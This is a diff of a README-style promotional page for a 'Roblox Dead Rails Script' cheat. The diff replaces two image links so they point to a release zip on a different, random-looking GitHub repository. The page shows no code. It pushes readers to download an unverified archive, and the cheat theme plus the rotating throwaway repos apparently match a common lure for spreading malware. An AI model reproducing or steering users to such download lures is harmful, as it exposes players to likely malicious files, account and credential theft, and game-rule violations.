@@ -3,10 +3,10 @@
 Are you searching for the best **Roblox Dead Rails Script** to dominate the game and unlock secret features? You’ve landed in the right place. In this comprehensive guide, we’ll explore everything you need to know about Dead Rails, the latest scripts, how to use them safely, and tips for maximizing your gameplay with advanced scripting tools.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 Whether you're a new player or a seasoned scripter, this guide is packed with valuable insights to help you take full control in **Roblox Dead Rails**.
